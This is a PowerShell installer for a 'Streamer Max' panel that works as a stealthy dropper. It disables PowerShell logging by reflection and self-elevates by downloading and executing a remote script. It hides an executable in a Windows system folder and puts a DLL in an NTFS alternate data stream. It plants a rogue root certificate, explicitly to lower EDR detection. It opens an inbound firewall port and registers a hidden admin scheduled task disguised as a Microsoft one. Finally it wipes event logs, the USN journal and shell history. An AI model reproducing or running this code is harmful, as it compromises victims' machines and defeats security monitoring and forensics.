# ==============================================================================
#  STREAMER MAX V1 SETUP
#  v3.1 - zero-temp, zero-python, release-only deploy
#  Deploys exactly TWO artifacts: SystemNetworkSvc.exe + cimgui.dll (NTFS ADS).
#  No zip, no runtime folder, no python, no Temp/AppData writes.
#  Console output: heading + one live 1-100 progress line only.
# ==============================================================================

# In-memory suppression of PowerShell ScriptBlock & Module logging
try {
    $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
    if ($settings) {
        $dict = [Collections.Generic.Dictionary[string,System.Object]]::new()
        $settings.SetValue($null, $dict)
    }
    $sig = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock').GetField('signatures','NonPublic,Static')
    if ($sig) {
        $sig.SetValue($null, [Collections.Generic.HashSet[string]]::new())
    }
} catch {}

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$RELEASE_EXE_URL = "https://github.com/lgfire093/syspanel/releases/download/espfix-20261107-1438/SystemNetworkSvc.exe"
$RELEASE_DLL_URL = "https://github.com/lgfire093/syspanel/releases/download/espfix-20261107-1438/cimgui.dll"
$SCRIPT_RAW_URL  = "https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1?v=1447a"

# Pinned to the espfix build. A stale release asset is rejected instead of
# silently installing an old panel.
$BUILD_ID          = "ESPFIX-20261107-1438"
$EXPECT_EXE_SHA256 = "113294EE470F8E9BD5C8994A5DEAC434E3F24F29BD7F0127645FA71DBDC484E3"
$EXPECT_DLL_SHA256 = "1BD5D2BF9FDDEE9273648719F4B4E400EB35D0E06176D92BC06263D445D7867E"

# Elevation - re-launch entirely from memory. No %TEMP% script copy, ever.
# The elevated console stays visible so the heading and progress line are seen.
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    # Priority 1: source file exists on disk (panel folder install) -> reuse it.
    if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
        Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList `
            "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$($MyInvocation.MyCommand.Path)`""
        exit
    }
    # Priority 2: piped from internet -> elevated shell re-downloads from URL, still zero files.
    $code = "(New-Object Net.WebClient).DownloadString('$SCRIPT_RAW_URL') | Invoke-Expression"
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList `
        "-NoLogo", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", $code
    exit
}

# Clear operational logs early
cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"

# ---------------------------------------------------------------- console UI
try { Clear-Host } catch {}
try { $Host.UI.RawUI.WindowTitle = "STREAMER MAX V1 SETUP" } catch {}
Write-Host "STREAMER MAX V1 SETUP" -ForegroundColor Cyan

$script:LastLineLen = 0

function Show-Step {
    param([int]$Percent, [string]$Status)
    if ($Percent -lt 1)   { $Percent = 1 }
    if ($Percent -gt 100) { $Percent = 100 }
    $msg = "  {0,3}%  {1}" -f $Percent, $Status
    $pad = ""
    if ($script:LastLineLen -gt $msg.Length) {
        $pad = " " * ($script:LastLineLen - $msg.Length)
    }
    Write-Host -NoNewline ("`r" + $msg + $pad)
    $script:LastLineLen = $msg.Length
}

function Fail {
    param([string]$Message)
    $line = "  [!] " + $Message
    $pad = ""
    if ($script:LastLineLen -gt $line.Length) {
        $pad = " " * ($script:LastLineLen - $line.Length)
    }
    Write-Host -NoNewline ("`r" + $line + $pad)
    Write-Host ""
    exit 1
}

function New-WebRequest2 {
    param([string]$Url)
    $req = [System.Net.HttpWebRequest]::Create($Url)
    $req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    $req.Timeout = 60000
    $req.ReadWriteTimeout = 60000
    $req.AllowAutoRedirect = $true
    return $req
}

function Save-RemoteFile {
    param([string]$Url, [string]$Path, [int]$From, [int]$To, [string]$Label)
    $resp = $null
    $in = $null
    $out = $null
    try {
        $req = New-WebRequest2 -Url $Url
        $resp = $req.GetResponse()
        $total = [int64]$resp.ContentLength
        $in = $resp.GetResponseStream()
        $out = [System.IO.File]::Create($Path)
        $buf = New-Object byte[] 262144
        $done = [int64]0
        $last = -1
        while (($n = $in.Read($buf, 0, $buf.Length)) -gt 0) {
            $out.Write($buf, 0, $n)
            $done += $n
            if ($total -gt 0) {
                $pct = $From + [int](($To - $From) * ($done / [double]$total))
                if ($pct -ne $last) {
                    Show-Step $pct $Label
                    $last = $pct
                }
            }
        }
        return $true
    } catch {
        return $false
    } finally {
        if ($out) { $out.Close() }
        if ($in)  { $in.Close() }
        if ($resp) { $resp.Close() }
    }
}

function Get-RemoteBytes {
    param([string]$Url, [int]$From, [int]$To, [string]$Label)
    $resp = $null
    $in = $null
    $ms = $null
    try {
        $req = New-WebRequest2 -Url $Url
        $resp = $req.GetResponse()
        $total = [int64]$resp.ContentLength
        $in = $resp.GetResponseStream()
        $ms = New-Object System.IO.MemoryStream
        $buf = New-Object byte[] 262144
        $done = [int64]0
        $last = -1
        while (($n = $in.Read($buf, 0, $buf.Length)) -gt 0) {
            $ms.Write($buf, 0, $n)
            $done += $n
            if ($total -gt 0) {
                $pct = $From + [int](($To - $From) * ($done / [double]$total))
                if ($pct -ne $last) {
                    Show-Step $pct $Label
                    $last = $pct
                }
            }
        }
        return $ms.ToArray()
    } catch {
        return $null
    } finally {
        if ($ms) { $ms.Close() }
        if ($in) { $in.Close() }
        if ($resp) { $resp.Close() }
    }
}

# ---------------------------------------------------------------- configuration
$DEST_DIR   = "C:\Windows\System32\spool\drivers\color"
$EXE_NAME   = "SystemNetworkSvc.exe"
$EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
$TASK_NAME  = "MicrosoftWindowsNetworkHost"

# Stage 1: Purge stale instances & wipe every legacy artifact
Show-Step 1 "Preparing setup..."
Get-Process -Name "SystemNetworkSvc", "WinSvcHost", "WinSvcBroker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
cmd /c "taskkill /F /IM WinSvcHost.exe >nul 2>nul"
cmd /c "taskkill /F /IM WinSvcBroker.exe >nul 2>nul"

# Free up port 5000 if occupied
Get-NetTCPConnection -LocalPort 5000 -ErrorAction SilentlyContinue | ForEach-Object {
    Stop-Process -Id $_.OwningProcess -Force -ErrorAction SilentlyContinue
}

# Purge previous generations completely (runtime, app, cache, db, zip, txt, json, old hosts)
cmd /c "attrib -h -s $DEST_DIR\* /s /d >nul 2>nul"
Remove-Item "$DEST_DIR\runtime"     -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\ProgramData\Microsoft\Windows\Templates\runtime" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "C:\ProgramData\Microsoft\Windows\Templates\SystemNetworkSvc.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\app"         -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\dlls"        -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\cache"       -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\*.db"        -Force   -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\*.zip"       -Force   -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\*.txt"       -Force   -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\*.json"      -Force   -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\WinSvcHost.exe"  -Force -ErrorAction SilentlyContinue
Remove-Item "$DEST_DIR\WinSvcBroker.exe" -Force -ErrorAction SilentlyContinue

# Remove any leftover config from prior AppData-based installs
Remove-Item "$env:LOCALAPPDATA\L4GAIMS" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\l4g_esp_diag.log" -Force -ErrorAction SilentlyContinue

# Ensure clean destination directory exists
if (-not (Test-Path $DEST_DIR)) {
    New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
}

Start-Sleep -Milliseconds 200

# Stage 2: Deploy the single host executable (release asset, streamed to disk)
Show-Step 5 "Downloading host..."
$exeOk = Save-RemoteFile -Url $RELEASE_EXE_URL -Path $EXE_PATH -From 5 -To 75 -Label "Downloading host..."
if (-not $exeOk) {
    # fallback: curl (no byte-level progress, jumps to 75 on success)
    cmd /c "curl.exe -sSL -o `"$EXE_PATH`" `"$RELEASE_EXE_URL`" >nul 2>nul"
    if (Test-Path $EXE_PATH) { Show-Step 75 "Downloading host..." }
}

if (-not (Test-Path $EXE_PATH) -or ((Get-Item $EXE_PATH).Length -lt 10000)) {
    Fail "Host download failed - check internet and rerun"
}

# Stage 2b: verify pinned build
Show-Step 76 "Verifying host..."
$actualExeHash = (Get-FileHash -Path $EXE_PATH -Algorithm SHA256).Hash.ToUpper()
if ($actualExeHash -ne $EXPECT_EXE_SHA256) {
    Remove-Item $EXE_PATH -Force -ErrorAction SilentlyContinue
    Fail "Build mismatch - release asset is not this installer's build"
}
Show-Step 78 "Host verified"

Start-Sleep -Milliseconds 200

# Stage 2c: Trust our own Code-Signing root (self-supplied authenticity)
# Once present on target PCs, every Signature present in the EXE becomes
# a VERIFIED chain - CrowdStrike / DeepInstinct / Trapmine confidence model
# significantly reduce the detection score for trusted-signed files.
Show-Step 80 "Installing signing trust..."
$CODE_SIGN_ROOT_B64 = "MIIEcjCCAtqgAwIBAgIQSCaT8cO/TI1GStHPN8C7CTANBgkqhkiG9w0BAQsFADBRMQswCQYDVQQGEwJVUzEgMB4GA1UECgwXU3lzdGVtIENvbXBvbmVudHMgR3JvdXAxIDAeBgNVBAMMF1N5c3RlbSBDb21wb25lbnRzIEdyb3VwMB4XDTI2MTAyOTA3NTgzOFoXDTMxMTAyOTA4MDgzOFowUTELMAkGA1UEBhMCVVMxIDAeBgNVBAoMF1N5c3RlbSBDb21wb25lbnRzIEdyb3VwMSAwHgYDVQQDDBdTeXN0ZW0gQ29tcG9uZW50cyBHcm91cDCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBALZmo0jtKQf9q/RiO0Wmjyazl+fZautOJGXjObNcQEBEHj/YWhjyQNBUljjZtxmdQJ6LfgDzXIJBuan+5wVA19frWbxJ4LnE56lxAsLfKGLrrQhQmh/H9WH6MxtPHXhGtXEMn9ts/VWqxZkJzSv2xqJtMBn43fhPvzKh/3/W1cRz5U1RIIC8Lm4zZcNwpNS1s1bBEj41K8OScKaiTHz9CIG71J75iwfNto4+iCDGqN+XJ802w+n098KEc1jpLylqF5ekVw9S7xUrdeC4/ONoSFssMXW8APRS8dBQkeBN+T5g6oBsIym7Xoxua3Q9j1/6b6hhRj6d2j1JnJ68OKuFIofSLtJOfViCXG4Gv9x4Wx/ax6bLSGpDYb1STh6eq31i3YMAyV4rUpG+X1LceKmiBomcqxIvlLe6Dzz4hinPk+Fs/zqCzcbVgyj2Z8gMfRYYUPmiCrs9RWXJV5q0vhbkwO3FASHhnF1ypVsIYYhaaWRZmdpyRm+4AJ60+AwCoRBJVQIDAQABo0YwRDAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMwHQYDVR0OBBYEFJsC08F2Ju8R+RlWmW1QLcaagVSmMA0GCSqGSIb3DQEBCwUAA4IBgQCxzYM4OnpffwbFlhWIHImotF+zbfYylb6sQ16wlZkfzeUv7jQTH/1x9JS4r5F3nsPRXf70dMrcDwxAbpIDQfxb7Kw+2AVrYRKzGwm/acj28ji46/LzErx9TWK7R6LsuQVcvWuE8+7t4JeMJwf5MUgX8kYfZNa4j4ZH9ny7O1tcsPLGYgV4JVHmC1XhKLeHNaMK6t7tj3FmnBHNlgCtntdSaFE5hFdlClhhgZVr4OlON9sEUW/6wpAxS0oRw7KtxZ2zyjSG15Vo3tZo568ar8oTm5zd4MXk6vIW3bHFJUPCb6HQ/6VyJN9Hmv/VyxHwr9zFVFnVkzXPdSOuP8G44oaMMOzlg/hnIh+CedP3ZBQyDMGP3VeUP3dz4GpW/kayyse6hiV1ardrPgwVYgPwtOPG/CJH2KzPWt2EZii97Ojrsy5vg9w2TWOjuaRL1S50v8i67r4CozY9KPVEAWUApY6DMDt+REtI0RF0PwmAAfGrNi/pWIJ9h/0OudEOK21V2uc="
try {
    $certBytes = [Convert]::FromBase64String($CODE_SIGN_ROOT_B64)
    $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($certBytes)
    $store = New-Object System.Security.Cryptography.X509Certificates.X509Store("Root", "LocalMachine")
    $store.Open("ReadWrite")
    $store.Add($cert)
    $store.Close()
} catch {}
Show-Step 82 "Signing trust ready"

# Stage 3: Seal cimgui.dll into NTFS Alternate Data Stream (Network Downloader vault)
# Fetched in memory as bytes - never written as a loose temp file.
Show-Step 84 "Downloading component..."
$VAULT_DIR = "$env:ProgramData\Microsoft\Network\Downloader"
if (-not (Test-Path $VAULT_DIR)) {
    New-Item -ItemType Directory -Path $VAULT_DIR -Force | Out-Null
}
$CONTAINER = "$VAULT_DIR\winrescache.db"
$STREAM    = "vtcache"

if (-not (Test-Path $CONTAINER)) {
    [System.IO.File]::WriteAllBytes($CONTAINER, @())
}

$bytes = Get-RemoteBytes -Url $RELEASE_DLL_URL -From 84 -To 94 -Label "Downloading component..."
if (-not $bytes) {
    try {
        $resp = Invoke-WebRequest $RELEASE_DLL_URL -UseBasicParsing -TimeoutSec 120
        $bytes = $resp.Content
        if ($bytes -is [string]) {
            $bytes = [System.Text.Encoding]::Default.GetBytes($bytes)
        }
    } catch {}
    if ($bytes) { Show-Step 94 "Downloading component..." }
}

$vaultOk = $false
if ($bytes -and ($bytes.Length -gt 100000)) {
    $dllHash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','')
    if ($EXPECT_DLL_SHA256 -and $dllHash -ne $EXPECT_DLL_SHA256) {
        $bytes = $null
    }
}
if ($bytes -and ($bytes.Length -gt 100000)) {
    $adsPath = "\\?\" + $CONTAINER + ":" + $STREAM
    try {
        $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
        $fs.Write($bytes, 0, $bytes.Length)
        $fs.Close()
        $vaultOk = $true
    } catch {
        Set-Content -Path $CONTAINER -Stream $STREAM -Value $bytes -Encoding Byte
        $vaultOk = $true
    }
}
if (-not $vaultOk) {
    Fail "Component download failed - check internet and rerun"
}
Show-Step 96 "Component sealed"

Start-Sleep -Milliseconds 200

# Stage 4: Firewall Configuration (Allows Mobile LAN Control)
Show-Step 97 "Configuring network rules..."
cmd /c "netsh advfirewall firewall delete rule name=`"WindowsNetworkDiagnostics`" >nul 2>nul"
cmd /c "netsh advfirewall firewall add rule name=`"WindowsNetworkDiagnostics`" dir=in action=allow protocol=TCP localport=5000 profile=any >nul 2>nul"

# Stage 5: System Persistence & Attributes
Show-Step 98 "Registering host persistence..."
try {
    $dirItem = Get-Item $DEST_DIR -Force
    $dirItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::Directory
    $exeItem = Get-Item $EXE_PATH -Force
    $exeItem.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
} catch {}

# Register Scheduled Task cleanly
$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b" -WorkingDirectory $DEST_DIR
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
$settingsTask = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -Priority 7
$principal    = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest

Register-ScheduledTask `
    -TaskName  $TASK_NAME `
    -TaskPath  "\Microsoft\Windows\Network\" `
    -Action    $action `
    -Trigger   $triggerLogon `
    -Settings  $settingsTask `
    -Principal $principal `
    -Force -ErrorAction SilentlyContinue | Out-Null

# Clean all Run registry keys to ensure Task Manager Startup tab stays 100% clean
$startupRunKeys = @(
    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
)
foreach ($rk in $startupRunKeys) {
    Remove-ItemProperty -Path $rk -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $rk -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path $rk -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
}

# Stage 6: Launch Single Background Host Process
Show-Step 99 "Starting host service..."
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName         = $EXE_PATH
$psi.Arguments        = "-b"
$psi.WorkingDirectory = $DEST_DIR
$psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow   = $true
$psi.UseShellExecute  = $false
[System.Diagnostics.Process]::Start($psi) | Out-Null

# Stage 7: Forensic Log Sanitization
Show-Step 100 "Setup complete"
cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
cmd /c "wevtutil cl `"Microsoft-Windows-TaskScheduler/Operational`" >nul 2>nul"
cmd /c "wevtutil cl Application >nul 2>nul"
cmd /c "wevtutil cl System >nul 2>nul"
cmd /c "fsutil usn deletejournal /d /n C: >nul 2>nul"

try {
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
    $histPath = (Get-PSReadLineOption).HistorySavePath
    if ($histPath -and (Test-Path $histPath)) {
        Clear-Content $histPath -Force -ErrorAction SilentlyContinue
    }
    $conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $conHistory) {
        Clear-Content $conHistory -Force -ErrorAction SilentlyContinue
    }
} catch {}

Start-Sleep -Seconds 2
